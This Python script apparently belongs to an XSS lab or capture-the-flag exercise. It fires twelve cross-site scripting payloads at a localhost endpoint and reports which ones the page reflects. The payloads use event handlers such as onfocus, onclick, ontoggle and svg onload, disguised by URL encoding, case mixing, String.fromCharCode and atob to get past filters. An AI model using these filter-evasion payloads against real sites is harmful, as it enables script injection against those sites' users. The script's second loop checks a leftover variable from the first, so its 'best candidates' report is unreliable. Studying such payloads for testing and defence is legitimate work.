import requests,urllib.parse,time

url="http://127.0.0.1:33139/xss25"

test_cases=[
("onfocus_basic","<input autofocus onfocus=alert(String.fromCharCode(88,83,83))>"),
("onfocus_url","%3Cinput%20autofocus%20onfocus%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E"),
("onfocus_mixed","<input AuToFoCuS OnFoCuS=alert(String.fromCharCode(88,83,83))>"),
("onclick_basic","<img src=x onclick=alert(String.fromCharCode(88,83,83))>"),
("onclick_url","%3Cimg%20src%3Dx%20onclick%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E"),
("svg_basic","<svg><animate onbegin=alert(String.fromCharCode(88,83,83)) attributeName=x>"),
("details_basic","<details open ontoggle=alert(String.fromCharCode(88,83,83))>x</details>"),
("marquee_basic","<marquee onstart=alert(String.fromCharCode(88,83,83))>x</marquee>"),
("atob_basic","<img src=x onclick=alert(atob('WFNTOw=='))>"),
("atob_url","%3Cimg%20src%3Dx%20onclick%3Dalert%28atob%28%27WFNTOw%3D%3D%27%29%29%3E"),
("svg_short","<svg/onload=alert(String.fromCharCode(88,83,83))>"),
("uppercase","<IMG SRC=123 ONCLICK=ALERT(STRING.FROMCHARCODE(88,83,83))>"),
]

print("Testing",len(test_cases),"payloads\n")

for name,payload in test_cases:
    try:
        r=requests.get(url,params={"input":payload},timeout=10)
        decoded=urllib.parse.unquote(payload)if"%"in payload else payload
        reflected=decoded in r.text
        filter_block="filter"in r.text.lower() or"blocked"in r.text.lower()
        
        if filter_block:
            print(f"[X]{name}: BLOCKED")
        elif reflected:
            print(f"[~]{name}: REFLECTED"+(" (event)"if"on"in r.text.lower()else""))
        else:
            print(f"[?]{name}: NO REFLECT")
        
        # Throttle requests slightly
        time.sleep(0.1)
        
    except Exception as e:
        print(f"[!]{name}: ERROR {str(e)[:25]}")

print("\nDetailed check on best candidates:")
for name,payload in test_cases[:4]:
    try:
        r=requests.get(url,params={"input":payload},timeout=10)
        full_url=f"{url}?input={urllib.parse.quote(payload)}"
        if decoded in r.text:
            # Check if it has event handlers
            has_event="onfocus"in r.text or"onclick"in r.text
            print(f"\n{name}: {'EXECUTABLE?' if has_event else 'REFLECTED'}")
            print(f"Test: {full_url}")
    except:
        pass
